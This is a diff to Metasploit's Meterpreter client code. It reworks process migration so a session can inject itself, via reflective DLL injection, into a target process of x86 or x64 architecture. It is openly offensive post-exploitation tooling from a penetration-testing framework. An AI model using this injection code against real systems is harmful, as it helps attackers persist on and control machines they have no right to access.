@@ -142,7 +142,7 @@ class ClientCore < Extension
 		# Get us to the installation root and then into data/meterpreter, where
 		# the file is expected to be
 		path = ::File.join(Msf::Config.install_root, 'data', 'meterpreter', 'ext_server_' + mod.downcase + ".#{client.binary_suffix}")
-
+		
 		if (opts['ExtensionPath'])
 			path = opts['ExtensionPath']
 		end
@@ -166,57 +166,101 @@ class ClientCore < Extension
 	# by pid.  The connection to the server remains established.
 	#
 	def migrate( pid )
-
+		process       = nil
+		binary_suffix = nil
+		
+		# Load in the stdapi extension if not allready present so we can determine the target pid architecture...
+		client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
+		
+		# Determine the architecture for the pid we are going to migrate into...
+		client.sys.process.processes.each { | p |
+			if( p['pid'] == pid )
+				process = p
+				break
+			end
+		}
+		
+		# We cant migrate into a process that does not exist.
+		if( process == nil )
+			raise ArgumentError, "Cannot migrate into non existant process", caller
+		end
+		
+		# We cant migrate into a process that we are unable to open
+		if( process['arch'] == nil )
+			raise ArgumentError, "Cannot migrate into this process (insufficient privileges)", caller
+		end
+		
+		# And we also cant migrate into our own current process...
+		if( process['pid'] == client.sys.process.getpid )
+			raise ArgumentError, "Cannot migrate into current process", caller
+		end
+	
 		# Create a new payload stub
 		c = Class.new( ::Msf::Payload )
 		c.include( ::Msf::Payload::Stager )
 		
-		# Include the appropriate reflective dll injection module for the client architecture...
-		if( client.platform == 'x86/win32' )
+		# Include the appropriate reflective dll injection module for the target process architecture...
+		if( process['arch'] == ARCH_X86 )
 			c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
-		elsif( client.platform == 'x64/win64' )
+			binary_suffix = "dll"
+		elsif( process['arch'] == ARCH_X86_64 )
 			c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
+			binary_suffix = "x64.dll"
 		else
-			raise RuntimeError, "Unsupported migrate client platform #{client.platform}.", caller
-		end
-
-		if (client.ext.aliases.include?("stdapi"))
-			mypid = client.sys.process.getpid
-			if (pid == mypid)
-				raise ArgumentError, "Cannot migrate into current process", caller
-			end
+			raise RuntimeError, "Unsupported target architecture '#{process['arch']}' for process '#{process['name']}'.", caller
 		end
 
 		# Create the migrate stager
 		migrate_stager = c.new()
-		migrate_stager.datastore['DLL'] = ::File.join( Msf::Config.install_root, "data", "meterpreter", "metsrv.#{client.binary_suffix}" )
+		migrate_stager.datastore['DLL'] = ::File.join( Msf::Config.install_root, "data", "meterpreter", "metsrv.#{binary_suffix}" )
+		
 		payload = migrate_stager.stage_payload
 		
-		# Send the migration request
+		# Build the migration request
 		request = Packet.create_request( 'core_migrate' )
 		request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
 		request.add_tlv( TLV_TYPE_MIGRATE_LEN, payload.length )
 		request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, payload )
-		response = client.send_request( request )
-	
+		if( process['arch'] == ARCH_X86_64 )
+			request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
+		else
+			request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
+		end
+		
+		# Send the migration request (bump up the timeout to 60 seconds)
+		response = client.send_request( request, 60 )
+		
 		# Stop the socket monitor
 		client.dispatcher_thread.kill if client.dispatcher_thread 
 
 		###
 		# Now communicating with the new process
 		###
-		
+
 		# Renegotiate SSL over this socket
 		client.swap_sock_ssl_to_plain()
 		client.swap_sock_plain_to_ssl()
 		
 		# Restart the socket monitor
 		client.monitor_socket
-
-		# Give the stage some time to transmit
-		Rex::ThreadSafe.sleep( 5 )
 		
-		# Load all the extensions that were loaded in the previous instance
+		# Give the stage some time to transmit
+		# sf: the stage is sent in the migrate request so this may not be needed?
+		# sf: also, as the call to ssl.accept (client.swap_sock_plain_to_ssl) blocks we shouldnt need to wait.
+		#Rex::ThreadSafe.sleep( 5 )
+		
+		# Update the meterpreter platform/suffix for loading extensions as we may have changed target architecture
+		# sf: this is kinda hacky but it works. As ruby doesnt let you un-include a module this is the simplest solution I could think of.
+		# If the platform specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change significantly we will need a better way to do this.
+		if( process['arch'] == ARCH_X86_64 )
+			client.platform      = 'x64/win64'
+			client.binary_suffix = 'x64.dll'
+		else
+			client.platform      = 'x86/win32'
+			client.binary_suffix = 'dll'
+		end
+		
+		# Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
 		client.ext.aliases.keys.each { |e|
 			client.core.use(e) 
 		}
